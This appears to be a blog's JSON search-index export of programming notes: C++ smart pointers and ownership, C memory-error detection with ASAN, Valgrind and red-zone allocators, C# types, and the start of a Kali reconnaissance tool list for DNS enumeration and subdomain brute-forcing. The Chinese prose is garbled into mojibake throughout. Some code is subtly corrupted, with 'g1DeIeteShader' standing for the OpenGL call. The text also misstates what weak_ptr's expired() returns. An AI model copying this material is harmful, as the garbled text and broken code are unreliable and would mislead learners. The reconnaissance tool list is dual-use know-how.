æ˜¯ p æŒ‡å‘å¯¹è±¡ï¼ˆä¹Ÿå°±æ˜¯ Cï¼‰çš„æˆå‘˜å‡½æ•°ï¼Œä¸è¦æ··æ·†ã€‚ weak_ptr å¼±å¼•ç”¨çš„æ‹·è´ä¸è§£æ„ä¸å½±å“å…¶å¼•ç”¨è®¡æ•°å™¨ã€‚ å¯ä»¥é€šè¿‡ lock() éšæ—¶äº§ç”Ÿä¸€ä¸ªæ–°çš„ shared_ptr ä½œä¸ºå¼ºå¼•ç”¨ã€‚ä½†ä¸ lock çš„æ—¶å€™ä¸å½±å“è®¡æ•°ã€‚ å¦‚æœå¤±æ•ˆï¼ˆè®¡æ•°å™¨å½’é›¶ï¼‰åˆ™ expired() ä¼šè¿”å› falseï¼Œä¸” lock() ä¹Ÿä¼šè¿”å› nullptrã€‚ 12345678910111213141516171819202122232425int main() &#123; std::shared_ptr&lt;C&gt; p = std::make_shared&lt;C&gt;(); // å¼•ç”¨è®¡æ•°åˆå§‹åŒ–ä¸º1 printf(\"use count = %ld\\n\", p.use_count()); // 1 std::weak_ptr&lt;C&gt; weak_p = p; // åˆ›å»ºä¸€ä¸ªä¸å½±å“è®¡æ•°å™¨çš„å¼±å¼•ç”¨ printf(\"use count = %ld\\n\", p.use_count()); // 1 func(std::move(p)); // æ§åˆ¶æƒè½¬ç§»ï¼Œp å˜ä¸º nullï¼Œå¼•ç”¨è®¡æ•°åŠ ä¸å˜ if (weak_p.expired()) printf(\"é”™è¯¯ï¼šå¼±å¼•ç”¨å·²å¤±æ•ˆï¼\"); else weak_p.lock()-&gt;do_something(); // æ­£å¸¸æ‰§è¡Œï¼Œp çš„ç”Ÿå‘½å‘¨æœŸä»è¢« objlist å»¶ç»­ç€ objlist.clear(); // åˆšåˆš p ç§»äº¤ç»™ func çš„ç”Ÿå‘½å‘¨æœŸç»“æŸäº†ï¼å¼•ç”¨è®¡æ•°å‡1ï¼Œå˜æˆ0äº† if (weak_p.expired()) // å› ä¸º shared_ptr æŒ‡å‘çš„å¯¹è±¡å·²é‡Šæ”¾ï¼Œå¼±å¼•ç”¨ä¼šå¤±æ•ˆ printf(\"é”™è¯¯ï¼šå¼±å¼•ç”¨å·²å¤±æ•ˆï¼\"); else weak_p.lock()-&gt;do_something(); // ä¸ä¼šæ‰§è¡Œ return 0; // åˆ°è¿™é‡Œæœ€åä¸€ä¸ªå¼±å¼•ç”¨ weak_p ä¹Ÿè¢«é‡Šæ”¾ï¼Œä»–æŒ‡å‘çš„â€œç®¡ç†å—â€è¢«é‡Šæ”¾&#125; 123456åˆ†é…å†…å­˜!use count = 1use count = 1æˆ‘çš„æ•°å­—æ˜¯ 42!é‡Šæ”¾å†…å­˜!é”™è¯¯ï¼šå¼±å¼•ç”¨å·²å¤±æ•ˆï¼ æ™ºèƒ½æŒ‡é’ˆä½œä¸ºç±»çš„æˆå‘˜å˜é‡ åˆ¤æ–­è¦ç”¨å“ªä¸€ç§æ™ºèƒ½æŒ‡é’ˆï¼š unique_ptrï¼šå½“è¯¥æŒ‡é’ˆæ‰€æŒ‡å¯¹è±¡ä»…ä»…å±äºæˆ‘æ—¶ã€‚æ¯”å¦‚ï¼šçˆ¶çª—å£ä¸­æŒ‡å‘å­çª—å£çš„æŒ‡é’ˆã€‚ åŸå§‹æŒ‡é’ˆï¼šå½“è¯¥å¯¹è±¡ä¸å±äºæˆ‘ï¼Œä½†ä»–é‡Šæ”¾å‰æˆ‘å¿…ç„¶è¢«é‡Šæ”¾æ—¶ã€‚æœ‰ä¸€å®šé£é™©ã€‚å¯¹è±¡ä½¿ç”¨æŒ‡é’ˆã€‚æ¯”å¦‚ï¼šå­çª—å£ä¸­æŒ‡å‘çˆ¶çª—å£çš„æŒ‡é’ˆã€‚ shared_ptrï¼šå½“è¯¥å¯¹è±¡ç”±å¤šä¸ªå¯¹è±¡å…±äº«æ—¶ï¼Œæˆ–è™½ç„¶è¯¥å¯¹è±¡ä»…ä»…å±äºæˆ‘ï¼Œä½†æœ‰ä½¿ç”¨ weak_ptr çš„éœ€è¦ï¼Œå¯¹è±¡ä½¿ç”¨shared_ptrã€‚ weak_ptrï¼šå½“è¯¥å¯¹è±¡ä¸å±äºæˆ‘ï¼Œä¸”ä»–é‡Šæ”¾åæˆ‘ä»å¯èƒ½ä¸è¢«é‡Šæ”¾æ—¶ï¼Œå¯¹è±¡ä½¿ç”¨weak_ptrã€‚æ¯”å¦‚ï¼šæŒ‡å‘çª—å£ä¸­ä¸Šä¸€æ¬¡è¢«ç‚¹å‡»çš„å…ƒç´ ã€‚ åˆå­¦è€…å¯ä»¥å¤šç”¨ shared_ptr å’Œ weak_ptr çš„ç»„åˆï¼Œæ›´å®‰å…¨ã€‚ shared_ptr éœ€è¦ç»´æŠ¤ä¸€ä¸ª atomic çš„å¼•ç”¨è®¡æ•°å™¨ï¼Œæ•ˆç‡ä½ï¼Œéœ€è¦é¢å¤–çš„ä¸€å—ç®¡ç†å†…å­˜ï¼Œè®¿é—®å®é™…å¯¹è±¡éœ€è¦äºŒçº§æŒ‡é’ˆï¼Œè€Œä¸” deleter ä½¿ç”¨äº†ç±»å‹æ“¦é™¤æŠ€æœ¯ã€‚ å…¨éƒ¨ç”¨ shared_ptrï¼Œå¯èƒ½å‡ºç°å¾ªç¯å¼•ç”¨ä¹‹ç±»çš„é—®é¢˜ï¼Œå¯¼è‡´å†…å­˜æ³„éœ²ï¼Œä¾ç„¶éœ€è¦ä½¿ç”¨ä¸å½±å“è®¡æ•°çš„åŸå§‹æŒ‡é’ˆæˆ–è€… weak_ptr æ¥é¿å…ã€‚ 1234567891011121314151617181920#include &lt;memory&gt;struct C &#123; std::shared_ptr&lt;C&gt; m_child; std::shared_ptr&lt;C&gt; m_parent;&#125;;int main() &#123; auto parent = std::make_shared&lt;C&gt;(); auto child = std::make_shared&lt;C&gt;(); // å»ºç«‹ç›¸äº’å¼•ç”¨ï¼š parent-&gt;m_child = child; child-&gt;m_parent = parent; parent = nullptr; // parent ä¸ä¼šè¢«é‡Šæ”¾ï¼å› ä¸º child è¿˜æŒ‡å‘ä»–ï¼ child = nullptr; // child ä¹Ÿä¸ä¼šè¢«é‡Šæ”¾ï¼å› ä¸º parent è¿˜æŒ‡å‘ä»–ï¼ return 0;&#125; å¦‚ä½•è§£å†³ï¼Ÿåªéœ€è¦æŠŠå…¶ä¸­é€»è¾‘ä¸Šâ€œä¸å…·æœ‰æ‰€å±æƒâ€çš„é‚£ä¸€ä¸ªæ”¹æˆ weak_ptr å³å¯ï¼š 1234567891011121314151617181920#include &lt;memory&gt;struct C &#123; std::shared_ptr&lt;C&gt; m_child; std::weak_ptr&lt;C&gt; m_parent;&#125;;int main() &#123; auto parent = std::make_shared&lt;C&gt;(); auto child = std::make_shared&lt;C&gt;(); // å»ºç«‹ç›¸äº’å¼•ç”¨ï¼š parent-&gt;m_child = child; child-&gt;m_parent = parent; parent = nullptr; // parent ä¼šè¢«é‡Šæ”¾ã€‚å› ä¸º child æŒ‡å‘ä»–çš„æ˜¯ **å¼±å¼•ç”¨** child = nullptr; // child ä¼šè¢«é‡Šæ”¾ã€‚å› ä¸ºæŒ‡å‘ child çš„ parent å·²ç»é‡Šæ”¾äº† return 0;&#125; æ”¹æˆ weak_ptrï¼Œ æ²¡æœ‰ parent çš„æ‰€æœ‰æƒã€‚ ä¹Ÿå¯ä»¥æŠŠ m_parent å˜æˆåŸå§‹æŒ‡é’ˆã€‚ 1234567891011121314151617181920#include &lt;memory&gt;struct C &#123; std::shared_ptr&lt;C&gt; m_child; C *m_parent;&#125;;int main() &#123; auto parent = std::make_shared&lt;C&gt;(); auto child = std::make_shared&lt;C&gt;(); // å»ºç«‹ç›¸äº’å¼•ç”¨ï¼š parent-&gt;m_child = child; child-&gt;m_parent = parent.get(); parent = nullptr; // parent ä¼šè¢«é‡Šæ”¾ã€‚å› ä¸º child æŒ‡å‘ä»–çš„æ˜¯åŸå§‹æŒ‡é’ˆ child = nullptr; // child ä¼šè¢«é‡Šæ”¾ã€‚å› ä¸ºæŒ‡å‘ child çš„ parent å·²ç»é‡Šæ”¾äº† return 0;&#125; å‡å®šä»–é‡Šæ”¾å‰æˆ‘å¿…ç„¶è¢«é‡Šæ”¾ï¼Œå®Œå…¨å¯ä»¥æŠŠ m_child å˜æˆä¸€ä¸ªæ ‡å¿—è¿™â€œå®Œå…¨æ‰€æœ‰æƒâ€çš„ unique_ptrã€‚ 1234567891011121314151617181920#include &lt;memory&gt;struct C &#123; std::unique_ptr&lt;C&gt; m_child; C *m_parent;&#125;;int main() &#123; auto parent = std::make_unique&lt;C&gt;(); auto child = std::make_unique&lt;C&gt;(); // å»ºç«‹ç›¸äº’å¼•ç”¨ï¼š child-&gt;m_parent = parent.get(); parent-&gt;m_child = std::move(child); // ç§»äº¤ child çš„æ‰€å±æƒç»™ parent parent = nullptr; // parent ä¼šè¢«é‡Šæ”¾ã€‚å› ä¸º child æŒ‡å‘ä»–çš„æ˜¯åŸå§‹æŒ‡é’ˆ // æ­¤æ—¶ child ä¹Ÿå·²ç»è¢«é‡Šæ”¾äº†ï¼Œå› ä¸º child å®Œå…¨éš¶å±äº parent return 0;&#125; å®‰å…¨ç±»å‹ ä»¥ä¸‹ç±»å‹æ˜¯å®‰å…¨çš„ï¼š 1234int id; // åŸºç¡€ç±»å‹std::vector&lt;int&gt; arr; // STL å®¹å™¨std::shared_ptr&lt;Object&gt; child; // æ™ºèƒ½æŒ‡é’ˆObject *parent; // åŸå§‹æŒ‡é’ˆï¼Œå¦‚æœæ˜¯ä»æ™ºèƒ½æŒ‡é’ˆé‡Œ .get() å‡ºæ¥çš„ ä»¥ä¸‹å¯¹è±¡æ˜¯ä¸å®‰å…¨çš„ï¼š 123char *ptr; // åŸå§‹æŒ‡é’ˆï¼Œå¦‚æœæ˜¯é€šè¿‡ malloc/free æˆ– new/delete åˆ†é…çš„GLint tex; // æ˜¯åŸºç¡€ç±»å‹ intï¼Œä½†æ˜¯å¯¹åº”ç€æŸç§èµ„æºstd::vector&lt;Object *&gt; objs; // STL å®¹å™¨ï¼Œä½†å­˜äº†ä¸å®‰å…¨çš„å¯¹è±¡ æœ‰ä¸å®‰å…¨ç±»å‹æˆå‘˜çš„å¯¹è±¡çš„ç±»çš„è®¾è®¡éœ€è¦è€ƒè™‘ä¹‹å‰çš„è®¾è®¡åŸåˆ™é—®é¢˜ã€‚ å¦‚æœä½ çš„ç±»æ‰€æœ‰æˆå‘˜ï¼Œéƒ½æ˜¯å®‰å…¨çš„ç±»å‹ï¼Œé‚£ä¹ˆäº”å¤§æ„é€ /ææ„å‡½æ•°éƒ½æ— éœ€å£°æ˜ï¼ˆæˆ–å£°æ˜ä¸º = defaultï¼‰ï¼Œä½ çš„ç±»è‡ªåŠ¨å°±æ˜¯å®‰å…¨çš„ã€‚ æœ€å¥½çš„åˆ¤æ–­æ–¹å¼æ˜¯ï¼šå¦‚æœä½ ä¸éœ€è¦è‡ªå®šä¹‰çš„è§£æ„å‡½æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±ä¸éœ€è¦æ‹…å¿ƒã€‚ å› ä¸ºå¦‚æœç”¨åˆ°äº†è‡ªå®šä¹‰è§£æ„å‡½æ•°ï¼Œå¾€å¾€æ„å‘³ç€ä½ çš„ç±»æˆå‘˜ä¸­ï¼ŒåŒ…å«æœ‰ä¸å®‰å…¨çš„ç±»å‹ã€‚ è¿™æ ·çš„ç±»å‹ä¸€èˆ¬æ— å¤–ä¹ä¸¤ç§æƒ…å†µï¼š ä½ çš„ç±»ç®¡ç†ç€èµ„æºã€‚ ä½ çš„ç±»æ˜¯æ•°æ®ç»“æ„ã€‚ ç®¡ç†ç€èµ„æºçš„ç±» è¿™ä¸ªç±»ç®¡ç†ç€æŸç§èµ„æºï¼Œèµ„æºå¾€å¾€ä¸èƒ½è¢«â€œå¤åˆ¶â€ã€‚æ¯”å¦‚ä¸€ä¸ª OpenGL çš„ç€è‰²å™¨ï¼Œæˆ–æ˜¯ä¸€ä¸ª Qt çš„çª—å£ã€‚ ä¸€èˆ¬åˆ é™¤æ‹·è´å‡½æ•°ï¼Œç„¶åç»Ÿä¸€ç”¨æ™ºèƒ½æŒ‡é’ˆç®¡ç†ã€‚ 1234567891011struct Shader &#123; GLuint sha; GLuint target&#123;GL_ARRAY_BUFFER&#125;; Shader(GLuint type) &#123; CHECK_GL(sha = g1CreateShader(type)); &#125; ~Shader() &#123; CHECK_GL(g1DeIeteShader(sha)); &#125; Shader(Shader const &amp;) = delete; Shader &amp;operator=(Shader const &amp;) = delete;&#125;; æ•°æ®ç»“æ„ç±» å¦‚æœå¯ä»¥ï¼Œè‡ªå·±å®šä¹‰æ‹·è´å’Œç§»åŠ¨å‡½æ•°ã€‚ å‡½æ•°å‚æ•°ç±»å‹ä¼˜åŒ– å¦‚æœæ˜¯åŸºç¡€ç±»å‹ï¼ˆæ¯”å¦‚ intï¼Œfloatï¼‰åˆ™æŒ‰å€¼ä¼ é€’ï¼š float squareRoot(float val); å¦‚æœæ˜¯åŸå§‹æŒ‡é’ˆï¼ˆæ¯”å¦‚ int ï¼ŒObject ï¼‰åˆ™æŒ‰å€¼ä¼ é€’ï¼š void doSomethingWith(Object *ptr); å¦‚æœæ˜¯æ•°æ®å®¹å™¨ç±»å‹ï¼ˆæ¯”å¦‚ vectorï¼Œstringï¼‰åˆ™æŒ‰å¸¸å¼•ç”¨ä¼ é€’ï¼š int sumArray(std::vector const &amp;arr); å¦‚æœæ•°æ®å®¹å™¨ä¸å¤§ï¼ˆæ¯”å¦‚ tuple&lt;int, int&gt;ï¼‰ï¼Œåˆ™å…¶å®å¯ä»¥æŒ‰å€¼ä¼ é€’ï¼š glm::vec3 calculateGravityAt(glm::vec3 pos); å¦‚æœæ˜¯æ™ºèƒ½æŒ‡é’ˆï¼ˆæ¯”å¦‚ shared_ptrï¼‰ï¼Œä¸”éœ€è¦ç”Ÿå‘½å‘¨æœŸæ§åˆ¶æƒï¼Œåˆ™æŒ‰å€¼ä¼ é€’ï¼š void addObject(std::shared_ptr obj); å¦‚æœæ˜¯æ™ºèƒ½æŒ‡é’ˆï¼Œä½†ä¸éœ€è¦ç”Ÿå‘½å‘¨æœŸï¼Œåˆ™é€šè¿‡ .get() è·å–åŸå§‹æŒ‡é’ˆåï¼ŒæŒ‰å€¼ä¼ é€’ï¼š void modifyObject(Object *obj); å…¶ä»–è¯­è¨€å¯¹æ¯” Java å’Œ Python çš„ä¸šåŠ¡éœ€æ±‚å¤§å¤šæ˜¯åœ¨å’Œèµ„æºæ‰“äº¤é“ï¼Œä»è€ŒåŸºæœ¬éƒ½æ˜¯åˆšåˆšè¯´çš„è¦åˆ é™¤æ‹·è´å‡½æ•°çš„é‚£ä¸€ç±»ã€‚ Java å’Œ Python å¹²è„†ç®€åŒ–ï¼šä¸€åˆ‡éåŸºç¡€ç±»å‹çš„å¯¹è±¡éƒ½æ˜¯æµ…æ‹·è´ï¼Œå¼•ç”¨è®¡æ•°ç”±åƒåœ¾å›æ”¶æœºåˆ¶è‡ªåŠ¨ç®¡ç†ã€‚ ä»¥ç³»ç»Ÿçº§ç¼–ç¨‹ã€ç®—æ³•æ•°æ®ç»“æ„ã€é«˜æ€§èƒ½è®¡ç®—ä¸ºä¸»è¦ä¸šåŠ¡çš„ C++ï¼Œæ‰å‘å±•å‡ºäº†è¿™äº›æ€æƒ³ï¼Œå¹¶å°†æ‹·è´/ç§»åŠ¨/æŒ‡é’ˆ/å¯å˜æ€§/å¤šçº¿ç¨‹ç­‰æ¦‚å¿µä½œä¸ºè¯­è¨€åŸºæœ¬å…ƒç´ å­˜åœ¨ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"Cè¯­è¨€ç¨‹åºå†…å­˜å®‰å…¨æ£€æŸ¥","slug":"Cè¯­è¨€ç¨‹åºå†…å­˜å®‰å…¨æ£€æŸ¥","date":"2023-02-10T05:04:22.000Z","updated":"2024-01-09T10:22:44.130Z","comments":true,"path":"posts/4df195e7.html","link":"","permalink":"https://racleray.github.io/posts/4df195e7.html","excerpt":"Cè¯­è¨€ç¨‹åºå†…å­˜å®‰å…¨ï¼Œé™æ€æ£€æŸ¥å’ŒåŠ¨æ€æ£€æŸ¥","text":"é™æ€å­˜å‚¨åŒºæ£€æŸ¥ 123set(CMAKE_EXE_LINKER_FLAGS \"-Wl,-Map=output.map\") # ç”Ÿæˆmapæ–‡ä»¶ set(CMAKE_C_FLAGS \"-fdata-sections\") # æŠŠstaticå˜é‡åœ°å€è¾“å‡ºåˆ°mapæ–‡ä»¶ set(CMAKE_CXX_FLAGS \"-fdata-sections\") å¸®åŠ©æ£€æµ‹é™æ€å­˜å‚¨åŒºçš„arræ•°ç»„æ˜¯å¦å‡ºç°äº†æ•°ç»„è¶Šç•Œæ“ä½œã€‚ åŠ¨æ€å­˜å‚¨åŒºæ£€æŸ¥ å·¥å…· ASAN dmalloc valgrind ASAN ASANï¼ˆAddress Sanitizerï¼‰æ˜¯é’ˆå¯¹ C/C++ çš„å¿«é€Ÿå†…å­˜é”™è¯¯æ£€æµ‹å·¥å…·ï¼Œåœ¨è¿è¡Œæ—¶æ£€æµ‹ C/C++ ä»£ç ä¸­çš„å¤šç§å†…å­˜é”™è¯¯ã€‚ åœ¨ GCC ç¼–è¯‘é€‰é¡¹ä¸­è®¾ç½® -fsanitize=addressï¼Œå¯ç”¨å¿«é€Ÿå†…å­˜é”™è¯¯æ£€æµ‹å™¨ ASANã€‚æ¯”å¦‚ -fsanitize-coverage=trace-pcï¼Œå¯ç”¨è¦†ç›–ç‡æŒ‡å¯¼çš„æ¨¡ç³Šä»£ç æ£€æµ‹ï¼Œç­‰ã€‚ è¯¦ç»†å‚è€ƒï¼šHome Â· google/sanitizers Wiki (github.com) Valgrind Valgrindç”±å†…æ ¸ï¼ˆcoreï¼‰ä»¥åŠåŸºäºå†…æ ¸çš„å…¶ä»–è°ƒè¯•å·¥å…·ç»„æˆã€‚å…¶åŸºäºä»¿çœŸæ–¹å¼å¯¹ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼Œå®ƒå…ˆäºåº”ç”¨ç¨‹åºè·å–å®é™…å¤„ç†å™¨çš„æ§åˆ¶æƒï¼Œå¹¶åœ¨å®é™…å¤„ç†å™¨çš„åŸºç¡€ä¸Šä»¿çœŸä¸€ä¸ªè™šæ‹Ÿå¤„ç†å™¨ï¼Œå¹¶ä½¿åº”ç”¨ç¨‹åºè¿è¡Œäºè¿™ä¸ªè™šæ‹Ÿå¤„ç†å™¨ä¹‹ä¸Šï¼Œä»è€Œå¯¹åº”ç”¨ç¨‹åºçš„è¿è¡Œè¿›è¡Œç›‘è§†ã€‚ å®˜ç½‘ Valgrindå·¥å…·åŒ…åŒ…å«å¤šä¸ªå·¥å…·ï¼Œå¦‚Memcheckã€Cachegrindã€Helgrindã€Callgrindã€Massifã€‚ Memcheckå·¥å…·æ˜¯Valgrindä¸­æœ€å¸¸ç”¨çš„å·¥å…·ï¼Œç”¨æ¥æ£€æµ‹ç¨‹åºä¸­å‡ºç°çš„å†…å­˜é—®é¢˜ã€‚ Callgrindæ”¶é›†ç¨‹åºè¿è¡Œæ—¶çš„ä¸€äº›æ•°æ®ï¼Œå‡½æ•°è°ƒç”¨å…³ç³»ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥æœ‰é€‰æ‹©åœ°è¿›è¡Œcacheæ¨¡æ‹Ÿã€‚åœ¨è¿è¡Œç»“æŸæ—¶ï¼Œå®ƒä¼šæŠŠåˆ†ææ•°æ®å†™å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚ Helgrind ä¸»è¦ç”¨æ¥æ£€æŸ¥å¤šçº¿ç¨‹ç¨‹åºä¸­å‡ºç°çš„ç«äº‰é—®é¢˜ã€‚ Callgrind æ¨¡æ‹Ÿ CPUä¸­çš„ä¸€çº§ç¼“å­˜I1,D1å’ŒL2äºŒçº§ç¼“å­˜ï¼Œèƒ½å¤Ÿç²¾ç¡®åœ°æŒ‡å‡ºç¨‹åºä¸­ cacheçš„ä¸¢å¤±å’Œå‘½ä¸­ã€‚ Massif å †æ ˆåˆ†æå™¨ï¼Œå®ƒèƒ½æµ‹é‡ç¨‹åºåœ¨å †æ ˆä¸­ä½¿ç”¨äº†å¤šå°‘å†…å­˜ï¼Œå¦‚å †å—ã€å †ç®¡ç†å—å’Œæ ˆçš„å¤§å°ã€‚ ç®€å•ä½¿ç”¨ï¼Œå¯¹ä¸‹é¢çš„ C ç¨‹åºè¿›è¡Œæµ‹è¯•ï¼š 1234567891011#include &lt;stdlib.h&gt; void f(void) &#123; int* x = malloc(10 * sizeof(int)); x[10] = 0; // problem 1: heap block overrun &#125; // problem 2: memory leak -- x not freed int main(void) &#123; f(); return 0; &#125; 12345sudo apt install valgrindgcc -g valgrind_test.c -o valgrind_testvalgrind --leak-check=yes --tool=memcheck ./valgrind_test è‡ªå®šä¹‰å¸¦æ£€æµ‹çš„å†…å­˜ç®¡ç†å‡½æ•° åœ¨å®é™…å†…å®¹å‰ååŠ ä¸ŠæŒ‡å®šçš„æ ‡è®°æ•°æ®ï¼Œè¾¾åˆ°æ£€æµ‹å“¨å…µçš„æ•ˆæœã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#define BEFORE_RED_AREA_LEN (4) // å‰çº¢åŒºé•¿åº¦ #define AFTER_RED_AREA_LEN (4) // åçº¢åŒºé•¿åº¦ #define LEN_AREA_LEN (4) // é•¿åº¦åŒºé•¿åº¦ #define BEFORE_RED_AREA_DATA (0x11223344u) // å‰çº¢åŒºæ•°æ® #define AFTER_RED_AREA_DATA (0x55667788u) // åçº¢åŒºæ•°æ® void *Malloc(size_t __size) &#123; // ç”³è¯·å†…å­˜ï¼š4 + 4 + __size + 4 void *ptr = malloc(BEFORE_RED_AREA_LEN + AFTER_RED_AREA_LEN + __size + LEN_AREA_LEN); if (NULL == ptr) &#123; printf(\"[%s]malloc error\\n\", __FUNCTION__); return NULL; &#125; // å¾€å‰çº¢åŒºåœ°å€å†™å…¥å›ºå®šå€¼ *((unsigned int*)(ptr)) = BEFORE_RED_AREA_DATA; // å¾€é•¿åº¦åŒºåœ°å€å†™å…¥é•¿åº¦ *((unsigned int*)(ptr + BEFORE_RED_AREA_LEN)) = __size; // å¾€åçº¢åŒºåœ°å€å†™å…¥å›ºå®šå€¼ *((unsigned int*)(ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size)) = AFTER_RED_AREA_DATA; // è¿”å›æ•°æ®åŒºåœ°å€ void *data_area_ptr = (ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN); return data_area_ptr; &#125;void CheckMem(void *ptr, size_t __size) &#123; void *data_area_ptr = ptr; // æ£€æµ‹æ˜¯å¦è¸©äº†å‰çº¢åŒº printf(\"[%s]before_red_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(data_area_ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN))); assert(*((unsigned int*)(data_area_ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN)) == BEFORE_RED_AREA_DATA); // æ£€æµ‹æ˜¯å¦è¸©äº†é•¿åº¦åŒº printf(\"[%s]len_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(data_area_ptr - LEN_AREA_LEN))); assert(*((unsigned int*)(data_area_ptr - LEN_AREA_LEN)) == __size); // æ£€æµ‹æ˜¯å¦è¸©äº†åçº¢åŒº printf(\"[%s]after_red_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(data_area_ptr + __size))); assert(*((unsigned int*)(data_area_ptr + __size)) == AFTER_RED_AREA_DATA); &#125;void Free(void *ptr) &#123; void *all_area_ptr = ptr - LEN_AREA_LEN - BEFORE_RED_AREA_LEN; // æ£€æµ‹æ˜¯å¦è¸©äº†å‰çº¢åŒº printf(\"[%s]before_red_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(all_area_ptr))); assert(*((unsigned int*)(all_area_ptr)) == BEFORE_RED_AREA_DATA); // è¯»å–é•¿åº¦åŒºå†…å®¹ size_t __size = *((unsigned int*)(all_area_ptr + BEFORE_RED_AREA_LEN)); // æ£€æµ‹æ˜¯å¦è¸©äº†åçº¢åŒº printf(\"[%s]before_red_area_data = 0x%x\\n\", __FUNCTION__, *((unsigned int*)(all_area_ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size))); assert(*((unsigned int*)(all_area_ptr + BEFORE_RED_AREA_LEN + LEN_AREA_LEN + __size)) == AFTER_RED_AREA_DATA); // é‡Šæ”¾æ‰€æœ‰åŒºåŸŸå†…å­˜ free(all_area_ptr); &#125;","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"}],"author":"HeRui"},{"title":"C sharp","slug":"C-sharp","date":"2023-02-09T12:58:02.000Z","updated":"2024-01-09T10:22:55.007Z","comments":true,"path":"posts/abda3b00.html","link":"","permalink":"https://racleray.github.io/posts/abda3b00.html","excerpt":"C# basic types","text":"ç±»å‹ å€¼ç±»å‹ï¼šæ ˆ å¼•ç”¨ç±»å‹ï¼šæ ˆä¸Šä¸ºå¼•ç”¨ï¼Œå †ä¸Šä¸ºå®é™…å€¼ æŒ‡é’ˆç±»å‹ï¼šä¸å®‰å…¨æ¨¡å¼ä¸‹æ‰ä½¿ç”¨ ç±»å‹ç³»ç»Ÿè®¾è®¡ å€¼ç±»å‹ ç»§æ‰¿è‡ª System.ValueTypeï¼Œæ‰€æœ‰ç±»å‹åŸºç±» System.Object int æ˜¯ System.int32 çš„åˆ«å struct public private internal: namespace ä¸­å¯è®¿é—® protected enum var vname = ... è‡ªåŠ¨è¯†åˆ«ç±»å‹ å¼•ç”¨ç±»å‹ï¼š object string dynamicï¼šè¿è¡Œæ—¶æ£€æµ‹ç±»å‹ class interface abstract class ä¸ interface çš„åŒºåˆ« abstract class å¯ä»¥æœ‰æˆå‘˜å­—æ®µï¼Œæœ‰å®ç°çš„æ–¹æ³•ï¼Œclassåªèƒ½ç»§æ‰¿è‡ªä¸€ä¸ªabstract class interface ä¸èƒ½æœ‰æˆå‘˜å­—æ®µï¼Œä¸èƒ½æœ‰å®ç°çš„æ–¹æ³•ï¼Œclasså¯ä»¥ç»§æ‰¿è‡ªå¤šä¸ªinterface ç±»å‹è½¬æ¢ å¤§èŒƒå›´ç±»å‹å‘å°èŒƒå›´ç±»å‹è½¬æ¢ï¼Œéœ€è¦æ˜¾ç¤ºè½¬æ¢ï¼Œä¸¢å¤±ç²¾åº¦ çˆ¶ç±»å‘å­ç±»è½¬åŒ–ï¼Œä½¿ç”¨ parent as childï¼Œè½¬æ¢å¤±è´¥ä¼šè¿”å› null æŒ‡é’ˆ .ToString() Convert.ToInt32(\"199\") Int32.TryParse(\"asdf\", out intValue) IConventible: å€¼ç±»å‹è½¬åˆ°å †ä¸Šï¼Œè¿”å›å¼•ç”¨ object boxed = stackVal TypeConventer: å¼•ç”¨æŒ‡å‘çš„å€¼ï¼Œå­˜åˆ°æ ˆä¸Š int unboxed = (int)referenceObj int? å¯ä¸ºç©ºçš„ int ç±»å‹ ï¼ˆNullableï¼‰ é›†åˆç±»å‹ array int[] numbers = new int[6]; int[,] 2darray = new int[3, 3]; int[][] vard = new int[5][]; ArrayList List å¼ºåˆ¶ä½¿ç”¨ä¸€ç§ç±»å‹ï¼Œç›¸è¾ƒäºArrayListè€Œè¨€ Hashtable key, value ç±»å‹ä¸éœ€è¦æ¯ä¸ªæ¡ç›®é—´ä¸€è‡´ Dictionary key, value ç±»å‹éœ€è¦ä¸æŒ‡å®šæ¨¡æ¿ä¸­ç±»å‹ä¸€è‡´ ConcurrentDictionary SortedList æ ¹æ® key å€¼æ’åº","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C#","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C-sharp","slug":"C-sharp","permalink":"https://racleray.github.io/tags/C-sharp/"}],"author":"HeRui"},{"title":"kali hack tools","slug":"kali-hack-tools","date":"2023-01-09T04:59:21.000Z","updated":"2024-01-09T10:22:35.870Z","comments":true,"path":"posts/886c7636.html","link":"","permalink":"https://racleray.github.io/posts/886c7636.html","excerpt":"kali linux hack tools","text":"kali hack tools DNS åˆ†æ dnsdict6 install wget https://github.com/vanhauser-thc/thc-ipv6/archive/refs/tags/v3.8.tar.gz tar zvxf v3.8.tar.gz cd thc-ipv6-3.8 sudo apt-get install libpcap-dev libssl-dev libnetfilter-queue1 libnetfilter-queue-dev make sudo cp dnsdict6 /usr/bin/ usage Enumerates a domain for DNS entries. dnsmap dnsrecon fierce æŸ¥æ‰¾ç›®æ ‡çš„ipå’Œä¸»æœºåï¼Œè¿›è¡Œå­åŸŸåçˆ†ç ´ lbd load balance detector æ£€æµ‹DNSã€HTTPã€HTTPSæ˜¯å¦è´Ÿè½½å‡è¡¡ reverseraider kaliå·²ç»ç§»é™¤ host dig dnsenum dmitry ç½‘ç»œæ‰«æ traceroute windows ä¸‹ tracert ç”¨äºæ¢æµ‹ç½‘ç»œç¯å¢ƒ tctrace æœç´¢å¼•æ“ä¿¡æ¯ fimap 